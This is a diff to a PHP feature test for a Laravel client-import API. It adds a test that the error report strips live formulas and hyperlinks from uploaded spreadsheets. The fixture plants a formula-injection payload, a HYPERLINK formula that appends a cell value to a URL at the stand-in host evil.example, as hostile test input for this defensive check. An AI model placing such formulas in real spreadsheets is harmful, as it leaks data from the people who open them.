@@ -9,6 +9,7 @@ use App\Models\Import;
 use App\Models\Region;
 use Carbon\CarbonImmutable;
 use Illuminate\Support\Facades\Storage;
+use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;
 use Tests\Feature\Imports\Workbook;
 
 // Import des clients (Annexe B.3, EF-CLI-02) : création, mise à jour, région
@@ -287,6 +288,28 @@ describe('an invalid file', function () {
             ->and($sheet->getStyle('C2')->getFill()->getStartColor()->getARGB())->toBe('FFFFC7CE')
             ->and($sheet->getStyle('D3')->getFill()->getStartColor()->getARGB())->toBe('FFFFC7CE')
             ->and($sheet->getStyle('C3')->getFill()->getFillType())->toBe('none');
+        $spreadsheet->disconnectWorksheets();
+    });
+
+    it('leaves no live formula or link of the uploaded file in the report (§8.4)', function () {
+        $rows = [
+            ['code_client', 'raison_sociale', 'code_region', 'notes'],
+            ['C0200', 'Client A', 'EST2', null],
+        ];
+        $file = Workbook::upload($rows, 'clients.xlsx', function (Worksheet $sheet) {
+            $sheet->setCellValue('D2', '=HYPERLINK("https://evil.example/?d="&A2,"Ouvrir")');
+            $sheet->setCellValue('E2', '=1+1');
+            $sheet->getCell('B2')->getHyperlink()->setUrl('https://evil.example/');
+        });
+        $id = $this->actingAs($this->admin)->post('/api/v1/imports', ['type' => 'CLIENTS', 'file' => $file])->json('id');
+
+        $spreadsheet = Workbook::read($this->get("/api/v1/imports/{$id}/error-report")->assertOk()->streamedContent());
+        $sheet = $spreadsheet->getSheet(0);
+
+        expect($sheet->getCell('D2')->isFormula())->toBeFalse()
+            ->and($sheet->getCell('E2')->isFormula())->toBeFalse()
+            ->and($sheet->getCell('B2')->hasHyperlink())->toBeFalse()
+            ->and($sheet->getCell('B2')->getValue())->toBe('Client A');
         $spreadsheet->disconnectWorksheets();
     });
 
